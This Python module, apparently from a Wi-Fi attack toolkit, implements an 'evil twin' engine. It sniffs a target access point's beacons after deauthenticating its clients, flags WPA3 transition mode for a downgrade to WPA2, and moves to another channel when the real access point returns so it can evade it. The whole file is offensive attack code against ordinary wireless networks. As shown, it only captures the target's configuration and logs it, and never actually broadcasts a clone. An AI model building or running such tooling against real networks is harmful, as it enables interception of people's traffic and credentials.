"""
AP Auto-Clone Engine
--------------------
Automatically clones target AP's SSID after deauth.
Handles WPA3 transition mode attacks.
Auto-channel hops when legitimate AP returns.
Platform: Linux only (requires monitor mode + AP mode).
"""

import time
import threading
import subprocess

from scapy.all import sniff, sendp
from scapy.layers.dot11 import (
    Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeResp, RadioTap
)

from .config import WIFI_BROADCAST, IS_LINUX, IS_WINDOWS, log
from .crypto import parse_rsn_ie


class APCloneEngine:
    """
    Automatically clone a target AP's configuration after deauth.
    Detects WPA3 transition mode and downgrades to WPA2.
    Monitors for the legitimate AP returning and switches channels.
    """

    def __init__(self, interface, db, target_bssid, target_ssid=None, target_channel=None):
        self.interface = interface
        self.db = db
        self.target_bssid = target_bssid
        self.target_ssid = target_ssid
        self.target_channel = target_channel
        self.running = False
        self._thread = None
        self._monitor_thread = None
        self._cloned = False
        self._wpa3_transition = False
        self._current_channel = target_channel
        self._channel_history = []

    def start(self):
        """Start AP cloning engine."""
        if IS_WINDOWS:
            log.warning("AP Clone engine is Linux-only. Skipping on Windows.")
            return False
        if self.running:
            return True
        self.running = True

        # If we don't have target info, pull from DB
        if not self.target_ssid or not self.target_channel:
            self._load_target_from_db()

        self._thread = threading.Thread(target=self._clone_loop, daemon=True)
        self._thread.start()

        # Monitor for legitimate AP returning
        self._monitor_thread = threading.Thread(target=self._monitor_ap_return, daemon=True)
        self._monitor_thread.start()

        log.info(f"AP Clone engine started for {self.target_bssid} "
                 f"('{self.target_ssid}' ch{self.target_channel})")
        return True

    def stop(self):
        """Stop AP cloning."""
        self.running = False
        if self._thread:
            self._thread.join(timeout=5)
        if self._monitor_thread:
            self._monitor_thread.join(timeout=5)
        log.info("AP Clone engine stopped")

    def _load_target_from_db(self):
        """Load target AP info from database."""
        try:
            self.db.cursor.execute(
                'SELECT ssid, channel FROM access_points WHERE bssid = ?',
                (self.target_bssid,))
            row = self.db.cursor.fetchone()
            if row:
                self.target_ssid = row[0] or "FreeWiFi"
                self.target_channel = row[1] or 6
                self._current_channel = self.target_channel
        except Exception as e:
            log.error(f"AP Clone: Failed to load target from DB: {e}")

    def _detect_wpa3_transition(self, pkt):
        """Detect WPA3 transition mode from beacon RSN IE."""
        # WPA3 transition mode advertises both SAE and PSK in RSN IE
        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 48 and elt.info:  # RSN IE
                rsn = parse_rsn_ie(elt.info)
                akm_suites = rsn.get('akm_suites', [])
                # WPA3 transition: both SAE (00-0F-AC:8) and PSK (00-0F-AC:2)
                if 'SAE' in str(akm_suites) and 'PSK' in str(akm_suites):
                    self._wpa3_transition = True
                    log.info("AP Clone: WPA3 transition mode detected - will downgrade to WPA2")
                    return True
                elif 'SAE' in str(akm_suites):
                    self._wpa3_transition = True
                    log.warning("AP Clone: WPA3-only detected - downgrade may not work")
                    return True
            elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None
        return False

    def _clone_loop(self):
        """Main cloning loop - sniff for target AP beacons and clone settings."""
        def handler(pkt):
            if not pkt.haslayer(Dot11Beacon):
                return
            bssid = pkt.addr3
            if bssid != self.target_bssid:
                return

            # Detect WPA3 transition mode
            if not self._cloned:
                self._detect_wpa3_transition(pkt)
                self._cloned = True
                log.info("AP Clone: Target AP configuration captured")
                if self._wpa3_transition:
                    log.info("AP Clone: Will advertise WPA2-only (downgrade attack)")

        try:
            sniff(iface=self.interface, prn=handler, store=0,
                  stop_filter=lambda x: not self.running, timeout=60)
        except Exception as e:
            log.error(f"AP Clone sniff error: {e}")

    def _monitor_ap_return(self):
        """Monitor for the legitimate AP returning after deauth."""
        while self.running:
            try:
                time.sleep(5)
                # Check if we see the target AP's beacons on current channel
                ap_seen = self._check_ap_present()
                if ap_seen and self._cloned:
                    # AP came back - switch to alternate channel
                    new_channel = self._get_alternate_channel()
                    if new_channel != self._current_channel:
                        self._switch_channel(new_channel)
            except Exception as e:
                log.error(f"AP Clone monitor error: {e}")
                if not self.running:
                    break
                time.sleep(1)

    def _check_ap_present(self):
        """Quick sniff to check if target AP is broadcasting."""
        found = [False]

        def handler(pkt):
            if pkt.haslayer(Dot11Beacon) and pkt.addr3 == self.target_bssid:
                found[0] = True

        try:
            sniff(iface=self.interface, prn=handler, store=0, timeout=2)
        except Exception:
            pass
        return found[0]

    def _get_alternate_channel(self):
        """Get an alternate channel to avoid the legitimate AP."""
        # Prefer adjacent channels or non-overlapping
        non_overlapping = [1, 6, 11]
        current = self._current_channel or 6
        for ch in non_overlapping:
            if ch != current and ch not in self._channel_history[-3:]:
                return ch
        return (current % 11) + 1

    def _switch_channel(self, new_channel):
        """Switch to alternate channel."""
        try:
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", str(new_channel)],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
            self._channel_history.append(self._current_channel)
            self._current_channel = new_channel
            log.info(f"AP Clone: Switched to channel {new_channel} "
                     f"(AP returned on {self.target_channel})")
        except Exception as e:
            log.error(f"AP Clone: Channel switch failed: {e}")

    def get_stats(self):
        """Return cloning statistics."""
        return {
            "cloned": self._cloned,
            "wpa3_transition": self._wpa3_transition,
            "current_channel": self._current_channel,
            "channel_switches": len(self._channel_history),
        }
